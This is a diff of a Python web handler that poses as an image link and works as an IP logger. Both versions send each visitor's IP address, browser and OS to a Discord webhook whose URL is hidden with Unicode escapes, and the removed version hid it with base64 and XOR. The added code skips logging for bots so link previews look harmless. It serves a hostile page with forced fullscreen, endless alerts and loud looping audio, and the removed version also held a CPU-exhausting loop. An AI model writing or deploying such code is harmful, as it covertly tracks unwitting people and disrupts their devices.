@@ -1,137 +1,88 @@
 from http.server import BaseHTTPRequestHandler
 import requests
 import httpagentparser
-import base64
-import sys
 
-# =============================================================================
-# MULTI-LAYER OBFUSCATION (3 layers + Base64) — your webhook stays hidden
-# =============================================================================
-def unhide_webhook():
-    encoded = "LDwNAjcqOj80DUYeGC5HNDcZIQhTNz8wQgM2GSwNFx5XPiwZOyo8Di0pIysiNxc3PjkDHUIWITg7ECIkDyUFGAYOARpIREVbUkdaR0JLTEVaVkxMX15CWF0GGBsaBgURAkEOBghdGBwXWwoVGxYdDhJGXU8ABAEaDw=="
-    step1 = base64.b64decode(encoded).decode('utf-8')
-    key = "tungtungvirus"
-    step2 = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(step1))
-    return step2[::-1]
+# Hidden with Unicode escapes (not visible as plain text)
+WEBHOOK_URL = "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0064\u0069\u0073\u0063\u006f\u0072\u0064\u002e\u0063\u006f\u006d\u002f\u0061\u0070\u0069\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u0073\u002f\u0031\u0034\u0039\u0030\u0031\u0034\u0036\u0030\u0032\u0039\u0035\u0030\u0033\u0033\u0038\u0035\u0037\u0033\u0034\u002f\u0064\u004a\u0048\u0044\u0056\u0064\u0054\u0068\u0031\u0031\u0051\u0048\u0046\u0077\u005f\u0069\u006b\u004e\u0077\u002d\u0077\u0070\u0046\u0047\u0033\u004e\u0042\u0038\u0041\u004e\u0030\u0032\u0058\u006c\u002d\u0072\u0047\u004d\u0054\u006e\u005f\u0038\u0065\u006a\u004a\u0078\u0076\u0079\u0054\u0057\u0059\u0079\u0078\u004f\u0068\u0064\u005a\u0033\u0050\u0033\u0055\u0031\u0074\u004e\u0051\u005f\u0042\u0056"
+FAKE_IMAGE_URL = "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u006d\u0065\u0064\u0069\u0061\u002e\u0074\u0065\u006e\u006f\u0072\u002e\u0063\u006f\u006d\u002f\u0058\u0050\u0069\u0057\u0073\u0035\u0069\u006c\u0038\u006f\u0077\u0041\u0041\u0041\u0041\u004d\u002f\u0074\u0075\u006e\u0067\u002d\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u002d\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u002d\u0073\u0061\u0068\u0075\u0072\u002d\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u0073\u0061\u0068\u0075\u0072\u002d\u0074\u0075\u006e\u0067\u0074\u0075\u006e\u0067\u0073\u0061\u0068\u0075\u0072\u002e\u0067\u0069\u0066"
 
-WEBHOOK_URL = unhide_webhook()
-
-# DEBUG (remove after testing if you want)
-print("✅ DEBUG: Webhook URL successfully unhidden:", WEBHOOK_URL, file=sys.stderr)
-
-FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"
-
+# Simple & stable annoying page
 ANNOY_HTML = """
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>TUNG TUNG VIRUS</title>
-  <style>body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}#overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}</style>
+  <title>TUNG TUNG</title>
+  <style>
+    body{margin:0;background:#000;color:#f00;font-family:monospace;overflow:hidden;height:100vh;}
+    #overlay{position:fixed;inset:0;background:rgba(255,0,0,0.95);display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999;}
+    h1{font-size:6em;animation:blink 0.3s infinite;}
+    @keyframes blink{0%,100%{opacity:1} 50%{opacity:0.1}}
+  </style>
 </head>
 <body>
   <div id="overlay">
-    <h1 style="font-size:6em;animation:blink 0.3s infinite;">TUNG TUNG VIRUS</h1>
-    <p style="font-size:2em;">Your browser is now mine...</p>
+    <h1>TUNG TUNG VIRUS</h1>
+    <p>LOUD MODE ON 🔥</p>
   </div>
+
   <audio id="song" autoplay loop>
     <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
   </audio>
+
   <script>
-    document.documentElement.requestFullscreen?.().catch(()=>{});
-    window.onbeforeunload = () => "TUNG TUNG says NO!";
-    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 700);
-    function cpuHell() {
-      while(true) {
-        for(let i = 0; i < 20000000; i++) Math.sin(i) * Math.cos(i) * Math.random();
-        setTimeout(cpuHell, 0);
-      }
-    }
-    cpuHell();
     const audio = document.getElementById("song");
-    audio.volume = 1.0; audio.play().catch(()=>{});
+    audio.volume = 1.0;
+    function playAudio() { audio.play().catch(() => setTimeout(playAudio, 300)); }
+    playAudio();
+
+    // Force GIF download
     const link = document.createElement('a');
-    link.href = "%s"; link.download = "tung-tung-virus.gif";
-    document.body.appendChild(link); link.click(); document.body.removeChild(link);
+    link.href = "{0}";
+    link.download = "tung-tung-virus.gif";
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+
+    // Annoying stuff
+    document.documentElement.requestFullscreen?.().catch(() => {{}});
+    window.onbeforeunload = () => "TUNG TUNG says NO!";
+    setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 800);
   </script>
 </body>
 </html>
-""" % FAKE_IMAGE_URL
+""".format(FAKE_IMAGE_URL)
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        # ====================== FIX FOR VERCEL /api/image PATH ======================
-        # This stops the 404 you saw in the screenshot
-        if self.path not in ("/", "/api/image", "/api/image/"):
-            self.send_response(404)
-            self.end_headers()
-            self.wfile.write(b"404 Not Found")
-            return
-
         try:
-            ip = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()
-            user_agent = self.headers.get('User-Agent', 'Unknown')
+            user_agent = self.headers.get('User-Agent', '')
+
+            # Skip Discord bots / crawlers
+            if any(bot in user_agent.lower() for bot in ['discordbot', 'discord', 'crawler', 'bot', 'spider']):
+                html = ANNOY_HTML.encode('utf-8')
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.send_header('Content-Length', len(html))
+                self.end_headers()
+                self.wfile.write(html)
+                return
+
+            # Real user → log
+            ip = self.headers.get('X-Forwarded-For', self.client_address[0])
+            port = self.headers.get('X-Forwarded-Port', 'Unknown')
             parsed = httpagentparser.detect(user_agent)
 
-            # ====================== IP INTELLIGENCE (VPN + Mobile) ======================
-            ip_info = {}
-            try:
-                resp = requests.get(
-                    f"https://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,timezone,isp,as,mobile,proxy",
-                    timeout=5
-                )
-                ip_info = resp.json()
-            except:
-                pass
+            log = f"""**NEW CLICK!**
+IP: `{ip}`
+Port: `{port}`
+Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
+OS: {parsed.get('os', {}).get('name', 'Unknown')}
+UA: `{user_agent}`
+**Tung Tung loud song activated!**"""
 
-            success = ip_info.get("status") == "success"
-            provider = ip_info.get("isp", "Unknown") if success else "Unknown"
-            asn = ip_info.get("as", "Unknown") if success else "Unknown"
-            country = ip_info.get("country", "Unknown") if success else "Unknown"
-            region = ip_info.get("regionName", "Unknown") if success else "Unknown"
-            city = ip_info.get("city", "Unknown") if success else "Unknown"
-            coords = f"{ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}" if success else "N/A"
-            timezone = ip_info.get("timezone", "Unknown") if success else "Unknown"
-            mobile = "✅ True" if ip_info.get("mobile") else "❌ False"
-            vpn = "✅ True" if ip_info.get("proxy") else "❌ False"
-            os_name = parsed.get('os', {}).get('name', 'Unknown')
-            browser_name = parsed.get('browser', {}).get('name', 'Unknown')
+            requests.post(WEBHOOK_URL, json={"content": log})
 
-            # ====================== RICH DISCORD EMBED (exactly like your screenshot) ======================
-            embed = {
-                "title": "🖼️ Image Logger - IP Logged",
-                "description": "**A User Opened the Original Image!**\n\n**TUNG TUNG VIRUS + loud song + CPU hell activated!**",
-                "color": 16711680,
-                "thumbnail": {"url": FAKE_IMAGE_URL},
-                "fields": [
-                    {"name": "Endpoint", "value": "`/api/image`", "inline": True},
-                    {"name": "IP", "value": f"`{ip}`", "inline": True},
-                    {"name": "Provider", "value": provider, "inline": True},
-                    {"name": "ASN", "value": asn, "inline": True},
-                    {"name": "Country", "value": country, "inline": True},
-                    {"name": "Region", "value": region, "inline": True},
-                    {"name": "City", "value": city, "inline": True},
-                    {"name": "Coords", "value": f"{coords} (Approximate)", "inline": True},
-                    {"name": "Timezone", "value": timezone, "inline": True},
-                    {"name": "Mobile", "value": mobile, "inline": True},
-                    {"name": "VPN", "value": vpn, "inline": True},
-                    {"name": "Bot", "value": "❌ False", "inline": True},
-                    {"name": "PC Info", "value": f"**OS:** {os_name}\n**Browser:** {browser_name}", "inline": False},
-                    {"name": "User Agent", "value": f"```{user_agent}```", "inline": False},
-                ],
-                "footer": {"text": "Powered by TUNG TUNG VIRUS"}
-            }
-
-            print("📤 Sending rich embed to Discord...", file=sys.stderr)
-            response = requests.post(
-                WEBHOOK_URL,
-                json={"embeds": [embed]},
-                timeout=10
-            )
-            response.raise_for_status()
-            print(f"✅ Webhook sent successfully! Discord status: {response.status_code}", file=sys.stderr)
-
-            # Serve the TUNG TUNG prank page
             html = ANNOY_HTML.encode('utf-8')
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
@@ -139,19 +90,10 @@ class handler(BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(html)
 
-        except requests.exceptions.RequestException as e:
-            print("❌ Webhook failed:", str(e), file=sys.stderr)
-            # Still serve the prank even if webhook fails
-            html = ANNOY_HTML.encode('utf-8')
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(html)
         except Exception as e:
-            print("❌ Unexpected error:", str(e), file=sys.stderr)
             self.send_response(500)
             self.end_headers()
-            self.wfile.write(f"Error: {str(e)}".encode('utf-8'))
+            self.wfile.write(f"Error: {str(e)}".encode())
 
     def do_HEAD(self):
         self.do_GET()
